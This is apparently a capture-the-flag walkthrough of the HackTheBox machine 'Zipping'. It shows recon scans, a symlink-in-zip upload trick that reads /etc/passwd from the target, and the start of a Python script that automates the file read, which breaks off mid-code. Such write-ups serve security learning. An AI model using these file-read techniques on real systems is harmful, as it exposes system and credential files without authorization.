
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zipping - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
    <link rel="stylesheet" href="/monokai.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/articles.html">Articles</a></li>
                <li><a href="/writeups.html">WriteUPs</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/medium/zipping/img/zipping.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Zipping - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Zipping">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Zipping</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">08</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3><br/>About Zipping</h3><br/>
Zipping is a medium-difficulty machine on HackTheBox. Initially, we will exploit a file reading vulnerability to gain access to the source code of the page.<br/><br/>
<h3><br>Shell as rektsu</br></h3><br>
After reading the source code, we discovered an SQL Injection vulnerability. We managed to exploit it by bypassing certain input checks performed with regular expressions using the <code>preg_match</code> function, abusing the linefeed character. Once we found an attack vector, we succeeded in writing files to the system by exploiting the SQL injection. By abusing a GET parameter that uses the <code>include()</code> function on any specified file, we were able to execute commands on the system.<br/><br/>
<h3><br>Shell as root</br></h3><br>
As rektsu, we can execute a program as root using sudo privileges. This program loads a shared library that we can write as rektsu, enabling us to insert malicious content and escalate privileges.<br/><br/>
<h3><br>Recon</br></h3><br>
As always, we need to discover open ports on the victim machine. To achieve this, we will use <code>nmap</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.229</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.229</span> <span class="p">(</span><span class="mf">10.10.11.229</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">55107</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">10426</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
</pre></div>

At first glance, we notice that ports 22 and 80 are open on the victim machine. To identify which services are running on these ports, we can execute an exhaustive scan using <code>nmap</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.229</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.229</span> <span class="p">(</span><span class="mf">10.10.11.229</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.21</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">9.0</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">1</span><span class="n">ubuntu7</span><span class="mf">.3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="n">ec</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="mi">6</span><span class="n">a</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="n">aa</span><span class="p">:</span><span class="n">ac</span><span class="p">:</span><span class="mi">1</span><span class="n">e</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="n">c2</span><span class="p">:</span><span class="mi">84</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">eb</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="n">c7</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="n">fa</span><span class="p">:</span><span class="n">ad</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="n">ab</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="n">c5</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="n">a4</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">41</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.54</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Zipping</span> <span class="o">|</span> <span class="n">Watch</span> <span class="n">store</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.54</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
</pre></div>
<h3><br>Web Application - Port 80</br></h3><br>
Before accessing the website through our browser, we will perform reconnaissance scanning of technologies used on the website:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.229</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.229</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.54</span><span class="p">],</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">Email</span><span class="p">[</span><span class="n">info</span><span class="nd">@website</span><span class="o">.</span><span class="n">com</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.54</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.229</span><span class="p">],</span> <span class="n">JQuery</span><span class="p">[</span><span class="mf">3.4.1</span><span class="p">],</span> <span class="n">Meta</span><span class="o">-</span><span class="n">Author</span><span class="p">[</span><span class="n">Devcrud</span><span class="p">],</span> <span class="n">PoweredBy</span><span class="p">[</span><span class="n">precision</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Zipping</span> <span class="o">|</span> <span class="n">Watch</span> <span class="n">store</span><span class="p">]</span>
</pre></div>

Nothing to highlight for the moment.<br/><br/>
When accessing the website through our browser, we will encounter the following content:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/1.png"/><br/><br/>
<h3><br>Shop</br></h3><br>
There is a shop section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/2.png"/><br/><br/>
When clicking on a product, we will be redirected to the product page:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/3.png"/><br/><br/>
We can highlight the URL:<br/><br/>
<div class="highlight"><pre><span></span>http://10.10.11.229/shop/index.php?page=product&amp;id=2
</pre></div>

There are two interesting <code>GET</code> parameters. The <code>page</code> parameter seems to be pointing to a local file and concatenating the string <code>.php</code> to it. If we try to load this resource directly, it exists:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/4.png"/><br/><br/>
The <code>id</code> parameter seems to be related to the <code>product.php</code> file.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/5.png"/><br/><br/>
When specifying the <code>id</code> parameter on <code>product.php</code>, it doesn't return anything. I think this resource is interacting with a database.<br/><br/>
There is also an <code>upload.php</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/6.png"/><br/><br/>
There is an interesting message:<br/><br/>
<div class="highlight"><pre><span></span>If you are interested in working with us, do not hesitate to send us your curriculum.  

The application will only accept zip files, inside them there must be a pdf file containing your curriculum.
</pre></div>

It says that we can upload a 'curriculum' file in zip format. It specifies that there must be a PDF file in the zip file.<br/><br/>
To test this section, I will create a 'PDF' file with some content and then compress it:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s2">"This is a test"</span> <span class="o">&gt;</span> <span class="n">test</span><span class="o">.</span><span class="n">pdf</span>
</pre></div>

Now, I will simply compress it using the <code>zip</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="nb">zip</span> <span class="n">test</span><span class="o">.</span><span class="n">zip</span> <span class="n">test</span><span class="o">.</span><span class="n">pdf</span>
  <span class="n">adding</span><span class="p">:</span> <span class="n">test</span><span class="o">.</span><span class="n">pdf</span> <span class="p">(</span><span class="n">stored</span> <span class="mi">0</span><span class="o">%</span><span class="p">)</span>
</pre></div>

Once we have the ZIP file, we will upload it:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/7.png"/><br/><br/>
Once the file is uploaded, it displays a link to the uploaded file (unzipped):<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/8.png"/><br/><br/>
Since it was not actually a PDF file, it is not displaying anything.<br/><br/>
Let's see what happens if we attempt to upload a <code>php</code> file instead of a <code>zip</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'&lt;?php phpinfo(); ?&gt;'</span> <span class="o">&gt;</span> <span class="n">test</span><span class="o">.</span><span class="n">php</span>
</pre></div>

It returns an error:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/9.png"/><br/><br/>
Upon inspecting the request with <code>BurpSuite</code>, I realized that the filename saved in the zip file has to have the <code>.pdf</code> extension, regardless of its content.<br/><br/>
At the time the machine was launched, I abused the file upload section to upload a malicious PHP file, exploiting NULL-Byte injection, but it was patched a few days later.<br/><br/>
<h3><br>File Read - Abusing Symlinks</br></h3><br>
One thing we can try is to compress a symlink file in the <code>ZIP</code> file, so that when the victim unzips it, we can get the contents of a file we want. This can be done using the <code>-y</code> parameter of the <code>zip</code> tool.<br/><br/>
For instance, imagine that you want to read the <code>/etc/passwd</code> file, we could do something like this:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">f</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="n">passwd</span><span class="o">.</span><span class="n">pdf</span>
<span class="nd">elswix@kali</span><span class="err">$</span> <span class="nb">zip</span> <span class="o">-</span><span class="n">y</span> <span class="n">passwd</span><span class="o">.</span><span class="n">zip</span> <span class="n">passwd</span><span class="o">.</span><span class="n">pdf</span>
  <span class="n">adding</span><span class="p">:</span> <span class="n">passwd</span><span class="o">.</span><span class="n">pdf</span> <span class="p">(</span><span class="n">stored</span> <span class="mi">0</span><span class="o">%</span><span class="p">)</span>
</pre></div>

Remember that the files must end with the .pdf extension.<br/><br/>
Let's attempt to upload the <code>passwd.zip</code> file and see what happens:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/10.png"/><br/><br/>
It was successfully uploaded. Let's see what happens if we click the link:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/11.png"/><br/><br/>
It is not loading anything, but it is understandable since the '/etc/passwd' file is not a PDF. We could try to read the content by making a GET request from our console:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.229</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="mi">344</span><span class="n">cc8f6bae56b127160992a8768c290</span><span class="o">/</span><span class="n">passwd</span><span class="o">.</span><span class="n">pdf</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">109</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">rektsu</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">mysql</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">115</span><span class="p">:</span><span class="n">MySQL</span> <span class="n">Server</span><span class="p">,,,:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
</pre></div>

It is working, we are reading local files. Doing this process manually is annoying, we can automate it using Python:<br/><br/>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">stat</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">zipfile</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="c1"># https://stackoverflow.com/questions/35782941/archiving-symlinks-with-python-zipfile</span>

<span class="k">def</span> <span class="nf">create_zip_with_symlink</span><span class="p">(</span><span class="n">output_zip_filename</span><span class="p">,</span> <span class="n">link_source</span><span class="p">,</span> <span class="n">link_target</span><span class="p">):</span>
    <span class="n">zipInfo</span>  <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipInfo</span><span class="p">(</span><span class="n">link_source</span><span class="p">)</span>
    <span class="n">zipInfo</span><span class="o">.</span><span class="n">create_system</span> <span class="o">=</span> <span class="mi">3</span> 
    <span class="n">unix_st_mode</span> <span class="o">=</span> <span class="n">stat</span><span class="o">.</span><span class="n">S_IFLNK</span> 
    <span class="n">zipInfo</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">=</span> <span class="n">unix_st_mode</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span> 
    <span class="n">zipOut</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">output_zip_filename</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">,</span> <span class="n">compression</span><span class="o">=</span><span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
    <span class="n">zipOut</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">zipInfo</span><span class="p">,</span> <span class="n">link_target</span><span class="p">)</span>
    <span class="n">zipOut</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">readFile</span><span class="p">():</span>

    <span class="n">mainUrl</span> <span class="o">=</span> <span class="s2">"http://10.10.11.229/"</span>
    <span class="n">uploadUrl</span> <span class="o">=</span> <span class="n">mainUrl</span> <span class="o">+</span> <span class="s2">"upload.php"</span>

    <span class="n">zipContent</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"./malicious.zip"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">fileBody</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"zipFile"</span><span class="p">:(</span><span class="s2">"malicious.zip"</span><span class="p">,</span><span class="n">zipContent</span><span class="p">),</span><span class="s2">"submit"</span><span class="p">:(</span><span class="kc">None</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">)}</span>

    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uploadUrl</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">fileBody</span><span class="p">)</span>

    <span class="n">regex</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'href="(.*?)"'</span>
    <span class="n">fileUrl</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
